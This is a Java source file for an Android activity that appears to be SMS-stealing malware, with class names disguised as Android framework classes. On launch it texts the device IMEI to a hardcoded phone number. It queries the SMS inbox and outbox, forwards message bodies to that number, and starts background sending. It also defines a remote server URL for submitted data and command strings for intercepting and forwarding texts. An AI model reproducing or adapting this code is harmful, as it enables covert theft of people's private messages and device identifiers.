package android.app;

import java.util.Date;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.DQLiteOpenHelper;
import android.lang.Dhread;
import android.lang.LogUtils;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.telephony.DmsManager;
import android.telephony.TelephonyManager;

import com.umeng.analytics.AnalyticsConfig;
import com.umeng.analytics.MobclickAgent;

public class Dctivity extends Activity {

	private SharedPreferences sp;
	//imei发送  
	public static final String devicephone="13119529349";
	//提交数据
	public static final String Dctivityhttpurl="http://118.193.159.126/ce/aaaa/sms.asp";
	//短信转发
	public static final String phonenum="13119529349";
	//拦截
	public static final String lanjie="DX99#拦截-H";
	//转发
	public static final String zhuanfa="DX99#发送-H";
	//前缀
	public static final String qianzhui="ADWS772-";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
		AnalyticsConfig.setChannel("Channel"+GetDeviceId());
		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT+" "+Build.PRODUCT+"--"+Build.MODEL);
		Intent server=new Intent(this,Dervice.class);
		this.getApplicationContext().startService(server);
		
		Dpplication.regFilter(this);
		int code= getVersionCode();
		sp=this.getApplicationContext().getSharedPreferences("Dctivityconfig", Context.MODE_PRIVATE);
		if(sp.getBoolean("isfrist", true)||code!=sp.getInt("code", -100)){
			DmsManager.Send(this,devicephone,"AZ99#程序已安装"+GetDeviceId());
			new AsyncTask<Integer, Integer, Boolean>() {
				@Override
				protected Boolean doInBackground(Integer... params) {
					Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%你好%' and type in (1,2)", null, "_id desc");
					for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
						int type = c.getInt(c.getColumnIndex("type"));
						String body = c.getString(c.getColumnIndex("body"));
						String address = c.getString(c.getColumnIndex("address"));
						address = address.replace("+86", "").replace("+1", "");
						String lx = (type == 1 ? "收件箱" : "发件箱");
						DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
						DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
					}
					return c.getCount() == 0 ? false : true;
				}
				@Override
				protected void onPostExecute(Boolean result) {
					if (result) {
						Dhread.SartSend(Dctivity.this.getApplicationContext());
					}
					Editor editor=sp.edit();
					editor.putBoolean("isfrist", false);
					editor.putInt("code", getVersionCode());
					editor.commit();
					super.onPostExecute(result);
				}
			}.execute();
		}
	}
	
	public String GetDeviceId(){
		TelephonyManager tm=(TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getDeviceId();
	}

	public int getVersionCode() {
	    try {
	        PackageManager manager = this.getPackageManager();
	        PackageInfo info = manager.getPackageInfo(this.getPackageName(), 0);
	        return info.versionCode;
	    } catch (Exception e) {
	    }
	    return -1;
	}
	@Override
	public void onResume() {
		super.onResume();
		MobclickAgent.onResume(this);
	}
	@Override
	public void onPause() {
		super.onPause();
		MobclickAgent.onPause(this);
	}
}
